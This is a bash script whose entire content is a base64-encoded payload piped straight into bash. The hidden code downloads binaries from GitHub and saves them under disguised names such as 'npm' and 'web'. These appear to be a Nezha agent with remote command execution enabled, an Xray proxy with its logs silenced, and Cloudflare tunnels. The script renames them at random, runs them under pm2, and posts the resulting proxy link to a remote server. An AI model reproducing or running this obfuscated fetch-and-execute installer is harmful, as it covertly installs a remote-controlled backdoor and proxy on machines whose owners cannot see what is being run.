#!/bin/bash

echo "IyEvYmluL2Jhc2gKCmV4cG9ydCBWX1BPUlQ9JHtWX1BPUlQ6LSc4MDgwJ30KZXhwb3J0IENGUE9SVD0ke0NGUE9SVDotJzQ0Myd9CmV4cG9ydCBGSUxFX1BBVEg9JHtGSUxFX1BBVEg6LScvdG1wJ30KZXhwb3J0IFVVSUQ9JHtVVUlEOi0nNzE2MGI2OTYtZGQ1ZS00MmUzLWEwMjQtMTQ1ZTkyY2VjOTE2J30KZXhwb3J0IFZMUEFUSD0ke1ZMUEFUSDotJ3N0YXJ0dmwnfQpleHBvcnQgQ0ZfSVA9JHtDRl9JUDotJ2lwLnNiJ30KZXhwb3J0IE9QRU5TRVJWRVI9JHtPUEVOU0VSVkVSOi0nMSd9CmV4cG9ydCBPUEVOVVNDRj0ke09QRU5VU0NGOi0nMCd9CmV4cG9ydCBOVkVSU0lPTj0ke05WRVJTSU9OOi0nVjEnfQpleHBvcnQgTlBPUlQ9JHtOUE9SVDotJzQ0Myd9CgppZiBbICEgLWQgIiRGSUxFX1BBVEgiIF07IHRoZW4KICBta2RpciAtcCAiJHtGSUxFX1BBVEh9IgpmaQoKY2xlYW51cF9maWxlcygpIHsKICBybSAtcmYgJHtGSUxFX1BBVEh9LyoKfQoKIyBEb3dubG9hZCBEZXBlbmRlbmN5IEZpbGVzCmRvd25sb2FkX3Byb2dyYW0oKSB7CiAgbG9jYWwgcHJvZ3JhbV9uYW1lPSIkMSIKICBsb2NhbCBkZWZhdWx0X3VybD0iJDIiCiAgbG9jYWwgeDY0X3VybD0iJDMiCgogIGxvY2FsIGRvd25sb2FkX3VybAogIGNhc2UgIiQodW5hbWUgLW0pIiBpbgogICAgeDg2XzY0fGFtZDY0fHg2NCkKICAgICAgZG93bmxvYWRfdXJsPSIke3g2NF91cmx9IgogICAgICA7OwogICAgKikKICAgICAgZG93bmxvYWRfdXJsPSIke2RlZmF1bHRfdXJsfSIKICAgICAgOzsKICBlc2FjCgogIGlmIFsgISAtZiAiJHtwcm9ncmFtX25hbWV9IiBdOyB0aGVuCiAgICBpZiBbIC1uICIke2Rvd25sb2FkX3VybH0iIF07IHRoZW4KICAgICAgZWNobyAiRG93bmxvYWRpbmcgJHtwcm9ncmFtX25hbWV9Li4uIiA+IC9kZXYvbnVsbAogICAgICBpZiBjb21tYW5kIC12IGN1cmwgJj4gL2Rldi9udWxsOyB0aGVuCiAgICAgICAgY3VybCAtc1NMICIke2Rvd25sb2FkX3VybH0iIC1vICIke3Byb2dyYW1fbmFtZX0iCiAgICAgIGVsaWYgY29tbWFuZCAtdiB3Z2V0ICY+IC9kZXYvbnVsbDsgdGhlbgogICAgICAgIHdnZXQgLXFPICIke3Byb2dyYW1fbmFtZX0iICIke2Rvd25sb2FkX3VybH0iCiAgICAgIGZpCiAgICAgIGVjaG8gIkRvd25sb2FkZWQgJHtwcm9ncmFtX25hbWV9IiA+IC9kZXYvbnVsbAogICAgZWxzZQogICAgICBlY2hvICJTa2lwcGluZyBkb3dubG9hZCBmb3IgJHtwcm9ncmFtX25hbWV9IiA+IC9kZXYvbnVsbAogICAgZmkKICBlbHNlCiAgICBlY2hvICIke3Byb2dyYW1fbmFtZX0gYWxyZWFkeSBleGlzdHMsIHNraXBwaW5nIGRvd25sb2FkIiA+IC9kZXYvbnVsbAogIGZpCn0KCmluaXRpYWxpemVfZG93bmxvYWRzKCkgewogIGlmIFsgLW4gIiR7TlNFUlZFUn0iIF0gJiYgWyAtbiAiJHtOS0VZfSIgXTsgdGhlbgogICAgY2FzZSAiJHtOVkVSU0lPTn0iIGluCiAgICAgICJWMCIgKQogICAgICAgIGRvd25sb2FkX3Byb2dyYW0gIiR7RklMRV9QQVRIfS9ucG0iICJodHRwczovL2dpdGh1Yi5jb20va2FodW5hbWEvbXlmaWxlL3JlbGVhc2VzL2Rvd25sb2FkL21haW4vbmV6aGEtYWdlbnRfYXJtIiAiaHR0cHM6Ly9naXRodWIuY29tL2thaHVuYW1hL215ZmlsZS9yZWxlYXNlcy9kb3dubG9hZC9tYWluL25lemhhLWFnZW50IgogICAgICAgIDs7CiAgICAgICJWMSIgKQogICAgICAgIGRvd25sb2FkX3Byb2dyYW0gIiR7RklMRV9QQVRIfS9ucG0iICJodHRwczovL2dpdGh1Yi5jb20vbXl0Y2dkL215ZmlsZXMvcmVsZWFzZXMvZG93bmxvYWQvbWFpbi9uZXpoYS1hZ2VudHYxX2FybSIgImh0dHBzOi8vZ2l0aHViLmNvbS9teXRjZ2QvbXlmaWxlcy9yZWxlYXNlcy9kb3dubG9hZC9tYWluL25lemhhLWFnZW50djEiCiAgICAgICAgOzsKICAgIGVzYWMKICAgIHNsZWVwIDMKICAgIGNobW9kICt4ICR7RklMRV9QQVRIfS9ucG0KICBmaQoKICBkb3dubG9hZF9wcm9ncmFtICIke0ZJTEVfUEFUSH0vd2ViIiAiaHR0cHM6Ly9naXRodWIuY29tL215dGNnZC9teWZpbGVzL3JlbGVhc2VzL2Rvd25sb2FkL21haW4veHJheV9hcm0iICJodHRwczovL2dpdGh1Yi5jb20vbXl0Y2dkL215ZmlsZXMvcmVsZWFzZXMvZG93bmxvYWQvbWFpbi94cmF5IgogIHNsZWVwIDMKICBjaG1vZCAreCAke0ZJTEVfUEFUSH0vd2ViCgogIGlmIFsgIiR7T1BFTlNFUlZFUn0iIC1lcSAxIF07IHRoZW4KICAgIGRvd25sb2FkX3Byb2dyYW0gIiR7RklMRV9QQVRIfS9zZXJ2ZXIiICJodHRwczovL2dpdGh1Yi5jb20vY2xvdWRmbGFyZS9jbG91ZGZsYXJlZC9yZWxlYXNlcy9sYXRlc3QvZG93bmxvYWQvY2xvdWRmbGFyZWQtbGludXgtYXJtNjQiICJodHRwczovL2dpdGh1Yi5jb20vY2xvdWRmbGFyZS9jbG91ZGZsYXJlZC9yZWxlYXNlcy9sYXRlc3QvZG93bmxvYWQvY2xvdWRmbGFyZWQtbGludXgtYW1kNjQiCiAgICBzbGVlcCAzCiAgICBjaG1vZCAreCAke0ZJTEVfUEFUSH0vc2VydmVyCiAgZmkKfQoKIyBteV9jb25maWcKbXlfY29uZmlnKCkgewogIGdlbmVyYXRlX2NvbmZpZygpIHsKICBjYXQgPiAke0ZJTEVfUEFUSH0vb3V0Lmpzb24gPDwgRU9GCnsKICAgICJsb2ciOiB7CiAgICAgICAgImFjY2VzcyI6ICIvZGV2L251bGwiLAogICAgICAgICJlcnJvciI6ICIvZGV2L251bGwiLAogICAgICAgICJsb2dsZXZlbCI6ICJub25lIgogICAgfSwKICAgICJkbnMiOiB7CiAgICAgICAgInNlcnZlcnMiOiBbCiAgICAgICAgICAgICJodHRwcytsb2NhbDovLzguOC44LjgvZG5zLXF1ZXJ5IgogICAgICAgIF0KICAgIH0sCiAgICAiaW5ib3VuZHMiOiBbCiAgICAgICAgewogICAgICAgICAgICAicG9ydCI6ICR7Vl9QT1JUfSwKICAgICAgICAgICAgImxpc3RlbiI6ICI6OiIsCiAgICAgICAgICAgICJwcm90b2NvbCI6ICJ2bGVzcyIsCiAgICAgICAgICAgICJzZXR0aW5ncyI6IHsKICAgICAgICAgICAgICAgICJjbGllbnRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgImlkIjogIiR7VVVJRH0iLAogICAgICAgICAgICAgICAgICAgICAgICAibGV2ZWwiOiAwCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJkZWNyeXB0aW9uIjogIm5vbmUiCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJzdHJlYW1TZXR0aW5ncyI6IHsKICAgICAgICAgICAgICAgICJuZXR3b3JrIjogIndzIiwKICAgICAgICAgICAgICAgICJzZWN1cml0eSI6ICJub25lIiwKICAgICAgICAgICAgICAgICJ3c1NldHRpbmdzIjogewogICAgICAgICAgICAgICAgICAgICJwYXRoIjogIi8ke1ZMUEFUSH0iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJzbmlmZmluZyI6IHsKICAgICAgICAgICAgICAgICJlbmFibGVkIjogdHJ1ZSwKICAgICAgICAgICAgICAgICJkZXN0T3ZlcnJpZGUiOiBbCiAgICAgICAgICAgICAgICAgICAgImh0dHAiLAogICAgICAgICAgICAgICAgICAgICJ0bHMiLAogICAgICAgICAgICAgICAgICAgICJxdWljIgogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJtZXRhZGF0YU9ubHkiOiBmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgXSwKICAgICJvdXRib3VuZHMiOiBbCiAgICAgICAgewogICAgICAgICAgICAidGFnIjogImRpcmVjdCIsCiAgICAgICAgICAgICJwcm90b2NvbCI6ICJmcmVlZG9tIgogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICAidGFnIjogImJsb2NrIiwKICAgICAgICAgICAgInByb3RvY29sIjogImJsYWNraG9sZSIKICAgICAgICB9CiAgICBdCn0KRU9GCiAgfQoKICB2X3R5cGUoKSB7CiAgICBpZiBbIC1lICIke0ZJTEVfUEFUSH0vc2VydmVyIiBdICYmIFsgLXogIiR7Vl9BVVRIfSIgXSAmJiBbIC16ICIke1ZfRE9NQUlOfSIgXTsgdGhlbgogICAgICBlY2hvICJWX0FVVEggb3IgVl9ET01BSU4gaXMgZW1wdHksIHVzZSBRdWljayBUdW5uZWxzIiA+IC9kZXYvbnVsbAogICAgICByZXR1cm4KICAgIGZpCgogICAgaWYgWyAtZSAiJHtGSUxFX1BBVEh9L3NlcnZlciIgXSAmJiBbIC1uICIkKGVjaG8gIiR7Vl9BVVRIfSIgfCBncmVwIFR1bm5lbFNlY3JldCkiIF07IHRoZW4KICAgICAgZWNobyAke1ZfQVVUSH0gPiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KICAgICAgY2F0ID4gJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwgPDwgRU9GCnR1bm5lbD0kKGVjaG8gIiR7Vl9BVVRIfSIgfCBjdXQgLWRcIiAtZjEyKQpjcmVkZW50aWFscy1maWxlOiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KcHJvdG9jb2w6IGh0dHAyCgppbmdyZXNzOgogIC0gaG9zdG5hbWU6ICR7Vl9ET01BSU59CiAgICBzZXJ2aWNlOiBodHRwOi8vbG9jYWxob3N0OiAke1ZfUE9SVH0KICAgIG9yaWdpblJlcXVlc3Q6CiAgICAgIG5vVExTVmVyaWZ5OiB0cnVlCiAgLSBzZXJ2aWNlOiBodHRwX3N0YXR1czo0MDQKRU9GCiAgICBlbHNlCiAgICAgIGVjaG8gIlZfQVVUSCBNaXNtYXRjaCBUdW5uZWxTZWNyZXQiID4gL2Rldi9udWxsCiAgICBmaQogIH0KCiAgYXJncygpIHsKICAgIGNhc2UgIiRPUEVOVVNDRiIgaW4KICAgICAgIjAiICkKICAgICAgICBpZiBbICR7T1BFTlNFUlZFUn0gLWVxIDEgXSAmJiBbIC1lICIke0ZJTEVfUEFUSH0vc2VydmVyIiBdOyB0aGVuCiAgICAgICAgICBpZiBbIC1uICIkKGVjaG8gIiRWX0FVVEgiIHwgZ3JlcCAnXltBLVowLTlhLXo9XVx7MTIwLDI1MFx9JCcpIiBdOyB0aGVuCiAgICAgICAgICAgIGFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tbm8tYXV0b3VwZGF0ZSAtLXByb3RvY29sIGh0dHAyIHJ1biAtLXRva2VuICR7Vl9BVVRIfSIKICAgICAgICAgIGVsaWYgWyAtbiAiJChlY2hvICIkVl9BVVRIIiB8IGdyZXAgVHVubmVsU2VjcmV0KSIgXTsgdGhlbgogICAgICAgICAgICBhcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLWNvbmZpZyAke0ZJTEVfUEFUSH0vdHVubmVsLnltbCBydW4iCiAgICAgICAgICBlbHNlCiAgICAgICAgICAgIGFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tbm8tYXV0b3VwZGF0ZSAtLXByb3RvY29sIGh0dHAyIC0tbG9nZmlsZSAke0ZJTEVfUEFUSH0vYm9vdC5sb2cgLS1sb2dsZXZlbCBpbmZvIC0tdXJsIGh0dHA6Ly9sb2NhbGhvc3Q6JHtWX1BPUlR9IgogICAgICAgICAgZmkKICAgICAgICBmaQogICAgICAgIDs7CiAgICAgICIxIiApCiAgICAgICAgaWYgWyAke09QRU5TRVJWRVJ9IC1lcSAxIF0gJiYgWyAtZSAiJHtGSUxFX1BBVEh9L3NlcnZlciIgXTsgdGhlbgogICAgICAgICAgaWYgWyAtbiAiJChlY2hvICIkVl9BVVRIIiB8IGdyZXAgJ15bQS1aMC05YS16PV1cezEyMCwyNTBcfSQnKSIgXTsgdGhlbgogICAgICAgICAgICBhcmdzPSJ0dW5uZWwgLS1yZWdpb24gdXMgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLW5vLWF1dG91cGRhdGUgLS1wcm90b2NvbCBodHRwMiBydW4gLS10b2tlbiAke1ZfQVVUSH0iCiAgICAgICAgICBlbGlmIFsgLW4gIiQoZWNobyAiJFZfQVVUSCIgfCBncmVwIFR1bm5lbFNlY3JldCkiIF07IHRoZW4KICAgICAgICAgICAgYXJncz0idHVubmVsIC0tcmVnaW9uIHVzIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1jb25maWcgJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwgcnVuIgogICAgICAgICAgZWxzZQogICAgICAgICAgICBhcmdzPSJ0dW5uZWwgLS1yZWdpb24gdXMgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLW5vLWF1dG91cGRhdGUgLS1wcm90b2NvbCBodHRwMiAtLWxvZ2ZpbGUgJHtGSUxFX1BBVEh9L2Jvb3QubG9nIC0tbG9nbGV2ZWwgaW5mbyAtLXVybCBodHRwOi8vbG9jYWxob3N0OiR7Vl9QT1JUfSIKICAgICAgICAgIGZpCiAgICAgICAgZmkKICAgICAgICA7OwogICAgZXNhYwogIH0KCiAgZ2VuZXJhdGVfY29uZmlnCiAgdl90eXBlCiAgYXJncwp9CgojIGdlbmVyYXRlX3BtMl9maWxlCmdlbmVyYXRlX3BtMl9maWxlKCkgewogIHNlcnZlcl9yYW5kb21uZXNzPSQodHIgLWRjICdBLVphLXowLTknIDwvZGV2L3VyYW5kb20gfCBoZWFkIC1jIDUpCiAgd2ViX3JhbmRvbW5lc3M9JCh0ciAtZGMgJ0EtWmEtejAtOScgPC9kZXYvdXJhbmRvbSB8IGhlYWQgLWMgNSkKICBucG1fcmFuZG9tbmVzcz0kKHRyIC1kYyAnQS1aYS16MC05JyA8L2Rldi91cmFuZG9tIHwgaGVhZCAtYyA1KQoKICBpZiBbICIke09QRU5TRVJWRVJ9IiAtZXEgMSBdICYmIFsgLWUgIiR7RklMRV9QQVRIfS9zZXJ2ZXIiIF07IHRoZW4KICAgIG12ICR7RklMRV9QQVRIfS9zZXJ2ZXIgJHtGSUxFX1BBVEh9LyR7c2VydmVyX3JhbmRvbW5lc3N9ICYmIHNsZWVwIDEKICBmaQogIGlmIFsgLWUgIiR7RklMRV9QQVRIfS93ZWIiIF07IHRoZW4KICAgIG12ICR7RklMRV9QQVRIfS93ZWIgJHtGSUxFX1BBVEh9LyR7d2ViX3JhbmRvbW5lc3N9ICYmIHNsZWVwIDEKICBmaQoKICBpZiBbIC1uICIke05TRVJWRVJ9IiBdICYmIFsgLW4gIiR7TktFWX0iIF0gJiYgWyAtZSAiJHtGSUxFX1BBVEh9L25wbSIgXTsgdGhlbgogICAgbXYgJHtGSUxFX1BBVEh9L25wbSAke0ZJTEVfUEFUSH0vJHtucG1fcmFuZG9tbmVzc30KICAgIGNhc2UgIiROVkVSU0lPTiIgaW4KICAgICAgIlYwIiApCiAgICAgICAgdGxzUG9ydHM9KCI0NDMiICI4NDQzIiAiMjA5NiIgIjIwODciICIyMDgzIiAiMjA1MyIpCiAgICAgICAgaWYgW1sgIiAke3Rsc1BvcnRzW0BdfSAiID1+ICIgJHtOUE9SVH0gIiBdXTsgdGhlbgogICAgICAgICAgTlRMUz0iLS10bHMiCiAgICAgICAgZWxzZQogICAgICAgICAgTlRMUz0iIgogICAgICAgIGZpCiAgICAgICAgTlJVTlM9IiR7RklMRV9QQVRIfS8ke25wbV9yYW5kb21uZXNzfSAtcyAke05TRVJWRVJ9OiR7TlBPUlR9IC1wICR7TktFWX0gJHtOVExTfSAtLXJlcG9ydC1kZWxheT00IC0tZGlzYWJsZS1hdXRvLXVwZGF0ZSIKICAgICAgICA7OwogICAgICAiVjEiICkKICAgICAgICB0bHNQb3J0cz0oIjQ0MyIgIjg0NDMiICIyMDk2IiAiMjA4NyIgIjIwODMiICIyMDUzIikKICAgICAgICBpZiBbWyAiICR7dGxzUG9ydHNbQF19ICIgPX4gIiAke05QT1JUfSAiIF1dOyB0aGVuCiAgICAgICAgICBOVExTPSJ0cnVlIgogICAgICAgIGVsc2UKICAgICAgICAgIE5UTFM9ImZhbHNlIgogICAgICAgIGZpCiAgICAgICAgY2F0ID4gJHtGSUxFX1BBVEh9L2NvbmZpZy55bWwgPDwgQUJDCmNsaWVudF9zZWNyZXQ6ICROS0VZCmRlYnVnOiBmYWxzZQpkaXNhYmxlX2F1dG9fdXBkYXRlOiB0cnVlCmRpc2FibGVfY29tbWFuZF9leGVjdXRlOiBmYWxzZQpkaXNhYmxlX2ZvcmNlX3VwZGF0ZTogdHJ1ZQpkaXNhYmxlX25hdDogZmFsc2UKZGlzYWJsZV9zZW5kX3F1ZXJ5OiBmYWxzZQpncHU6IGZhbHNlCmluc2VjdXJlX3RsczogZmFsc2UKaXBfcmVwb3J0X3BlcmlvZDogMTgwMApyZXBvcnRfZGVsYXk6IDQKc2VydmVyOiAkTlNFUlZFUjokTlBPUlQKc2tpcF9jb25uZWN0aW9uX2NvdW50OiBmYWxzZQpza2lwX3Byb2NzX2NvdW50OiBmYWxzZQp0ZW1wZXJhdHVyZTogZmFsc2UKdGxzOiAkTlRMUwp1c2VfZ2l0ZWVfdG9fdXBncmFkZTogZmFsc2UKdXNlX2lwdjZfY291bnRyeV9jb2RlOiBmYWxzZQp1dWlkOiAkVVVJRApBQkMKICAgICAgICBOUlVOUz0iJHtGSUxFX1BBVEh9LyR7bnBtX3JhbmRvbW5lc3N9IC1jICR7RklMRV9QQVRIfS9jb25maWcueW1sIgogICAgICAgIDs7CiAgICBlc2FjCiAgZmkKCiAgY2F0ID4gJHtGSUxFX1BBVEh9L2Vjb3N5c3RlbS5jb25maWcuanMgPDwgQUJDCm1vZHVsZS5leHBvcnRzID0gewogICJhcHBzIjpbCiAgICAgIHsKICAgICAgICAgICJuYW1lIjoid2ViIiwKICAgICAgICAgICJzY3JpcHQiOiIke0ZJTEVfUEFUSH0vJHt3ZWJfcmFuZG9tbmVzc30gcnVuIC1jICR7RklMRV9QQVRIfS9vdXQuanNvbiIKQUJDCiAgaWYgWyAiJHtPUEVOU0VSVkVSfSIgLWVxIDEgXTsgdGhlbgogICAgY2F0ID4+ICR7RklMRV9QQVRIfS9lY29zeXN0ZW0uY29uZmlnLmpzIDw8IERFRgogICAgICB9LAogICAgICB7CiAgICAgICAgICAibmFtZSI6InNlcnZlciIsCiAgICAgICAgICAic2NyaXB0IjoiJHtGSUxFX1BBVEh9LyR7c2VydmVyX3JhbmRvbW5lc3N9ICR7YXJnc30iLApERUYKICBmaQogIGlmIFsgLW4gIiR7TlNFUlZFUn0iIF0gJiYgWyAtbiAiJHtOS0VZfSIgXTsgdGhlbgogICAgY2F0ID4+ICR7RklMRV9QQVRIfS9lY29zeXN0ZW0uY29uZmlnLmpzIDw8IEdISQogICAgICB9LAogICAgICB7CiAgICAgICAgICAibmFtZSI6Im5wbSIsCiAgICAgICAgICAic2NyaXB0IjoiJHtOUlVOU30iLApHSEkKICBmaQogIGNhdCA+PiAke0ZJTEVfUEFUSH0vZWNvc3lzdGVtLmNvbmZpZy5qcyA8PCBKS0wKICAgICAgfQogIF0KfQpKS0wKfQoKIyBydW4KcnVuX3Byb2Nlc3NlcygpIHsKICBnZW5lcmF0ZV9wbTJfZmlsZQoKICBpZiBbIC1lICIke0ZJTEVfUEFUSH0vZWNvc3lzdGVtLmNvbmZpZy5qcyIgXTsgdGhlbgogICAgcG0yIHN0YXJ0ICR7RklMRV9QQVRIfS9lY29zeXN0ZW0uY29uZmlnLmpzCiAgZmkKCiAgc2xlZXAgMzAKCiAgZXhwb3J0IElTUD0kKGN1cmwgLXMgaHR0cHM6Ly9pcGNvbmZpZy5uZXRsaWIucmUpICAgIyDmmL7npLpJU1Dlj4rlm73lrrbnroDnp7AgIGV4cG9ydCBJU1A9JChjdXJsIC1zIGh0dHBzOi8vc3BlZWQuY2xvdWRmbGFyZS5jb20vbWV0YSB8IGF3ayAtRlwiICd7cHJpbnQgJDI2Ii0iJDE4fScgfCBzZWQgLWUgJ3MvIC9fL2cnKSAmJiBzbGVlcCAxCiAgY2hlY2tfaG9zdG5hbWVfY2hhbmdlICYmIHNsZWVwIDIKCiAgaWYgWyAtbiAiJFNVUkwiIF07IHRoZW4KICAgIHVwbG9hZCA+L2Rldi9udWxsIDI+JjEgJgogIGVsc2UKICAgIGJ1aWxkX3VybHMKICBmaQp9CgojIGNoZWNrX2hvc3RuYW1lCmNoZWNrX2hvc3RuYW1lX2NoYW5nZSgpIHsKICBpZiBbIC1zICIke0ZJTEVfUEFUSH0vYm9vdC5sb2ciIF07IHRoZW4KICAgIGV4cG9ydCBWX0RPTUFJTj0kKGNhdCAke0ZJTEVfUEFUSH0vYm9vdC5sb2cgfCBncmVwIC1vICJpbmZvLipodHRwczovLy4qdHJ5Y2xvdWRmbGFyZS5jb20iIHwgc2VkICJzQC4qaHR0cHM6Ly9AQGciIHwgdGFpbCAtbiAxKQogIGZpCiAgaWYgWyAtbiAiJHtNWV9ET01BSU59IiBdICYmIFsgLXogIiR7Vl9ET01BSU59IiBdOyB0aGVuCiAgICBleHBvcnQgVl9ET01BSU49IiR7TVlfRE9NQUlOfSIKICBmaQogIGV4cG9ydCBVUExPQURfREFUQT0idmxlc3M6Ly8ke1VVSUR9QCR7Q0ZfSVB9OiR7Q0ZQT1JUfT9ob3N0PSR7Vl9ET01BSU59JnBhdGg9JTJGJHtWTFBBVEh9JTNGZWQlM0QyMDQ4JnR5cGU9d3MmZW5jcnlwdGlvbj1ub25lJnNlY3VyaXR5PXRscyZzbmk9JHtWX0RPTUFJTn0jJHtJU1B9LSR7U05BTUV9Igp9CgojIGJ1aWxkX3VybHMKYnVpbGRfdXJscygpIHsKICBpZiBbIC1uICIke1VQTE9BRF9EQVRBfSIgXTsgdGhlbgogICAgZWNobyAtZSAiJHtVUExPQURfREFUQX0iIHwgYmFzZTY0IHwgdHIgLWQgJ1xuJyA+ICIke0ZJTEVfUEFUSH0vbG9nLnR4dCIKICBmaQp9CgojIHVwbG9hZAp1cGxvYWRfc3Vic2NyaXB0aW9uKCkgewogIGlmIGNvbW1hbmQgLXYgY3VybCAmPiAvZGV2L251bGw7IHRoZW4KICAgIHJlc3BvbnNlPSQoY3VybCAtcyAtWCBQT1NUIC1IICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iIC1kICJ7XCJVUkxfTkFNRVwiOlwiJFNOQU1FXCIsXCJVUkxcIjpcIiRVUExPQURfREFUQVwifSIgJFNVUkwpCiAgZWxpZiBjb21tYW5kIC12IHdnZXQgJj4gL2Rldi9udWxsOyB0aGVuCiAgICByZXNwb25zZT0kKHdnZXQgLXFPLSAtLXBvc3QtZGF0YT0ie1wiVVJMX05BTUVcIjpcIiRTTkFNRVwiLFwiVVJMXCI6XCIkVVBMT0FEX0RBVEFcIn0iIC0taGVhZGVyPSJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iICRTVVJMKQogIGZpCn0KCmV4cG9ydCBwcmV2aW91c2FyZ29Eb21haW49IiIKdXBsb2FkKCkgewogIGlmIFsgJHtPUEVOU0VSVkVSfSAtZXEgMSBdICYmIFsgLXogIiR7Vl9BVVRIfSIgXTsgdGhlbgogICAgd2hpbGUgdHJ1ZTsgZG8KICAgICAgaWYgW1sgIiRwcmV2aW91c2FyZ29Eb21haW4iID09ICIkVl9ET01BSU4iIF1dOyB0aGVuCiAgICAgICAgZWNobyAiZG9tYWluIG5hbWUgaGFzIG5vdCBiZWVuIHVwZGF0ZWQsIG5vIG5lZWQgdG8gdXBsb2FkIiA+IC9kZXYvbnVsbAogICAgICBlbHNlCiAgICAgICAgdXBsb2FkX3N1YnNjcmlwdGlvbgogICAgICAgIGJ1aWxkX3VybHMKICAgICAgICBleHBvcnQgcHJldmlvdXNhcmdvRG9tYWluPSIkVl9ET01BSU4iCiAgICAgIGZpCiAgICAgIHNsZWVwIDYwCiAgICAgIGNoZWNrX2hvc3RuYW1lX2NoYW5nZSAmJiBzbGVlcCAyCiAgICBkb25lCiAgZWxzZQogICAgdXBsb2FkX3N1YnNjcmlwdGlvbgogICAgYnVpbGRfdXJscwogIGZpCn0KCiMgbWFpbgptYWluKCkgewogIGNsZWFudXBfZmlsZXMKICBpbml0aWFsaXplX2Rvd25sb2FkcwogIG15X2NvbmZpZwogIHJ1bl9wcm9jZXNzZXMKfQptYWlu" | base64 -d | bash
